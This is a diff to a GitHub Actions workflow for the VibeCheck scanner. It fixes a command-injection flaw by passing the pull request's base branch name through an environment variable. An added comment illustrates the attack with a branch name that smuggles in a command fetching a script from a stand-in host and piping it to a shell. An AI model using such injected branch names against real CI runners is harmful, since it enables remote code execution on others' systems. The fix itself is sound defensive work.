@@ -66,10 +66,17 @@ jobs:
       # checkout above uses fetch-depth: 0, so the base ref exists locally — with
       # a shallow clone the ref would be missing and VibeCheck would exit 3
       # rather than silently gate on nothing.
+      # base_ref goes through an intermediate env var rather than ${{ }} directly
+      # in run:. Branch names are attacker-controlled on fork pull requests, so
+      # interpolating one into the shell is a command-injection vector — a branch
+      # named `main"; curl evil.sh | sh; "` would execute on the runner.
+      # (VibeCheck flagged this in its own workflow on PR #3.)
       - name: Run VibeCheck on itself (PR — changed files only)
         if: github.event_name == 'pull_request'
+        env:
+          BASE_REF: ${{ github.base_ref }}
         run: ./vibecheck.sh --fail-on high --semgrep-config p/ci --skip-deps
-                            --diff "origin/${{ github.base_ref }}"
+                            --diff "origin/$BASE_REF"
 
       - name: Run VibeCheck on itself (full scan)
         if: github.event_name != 'pull_request'
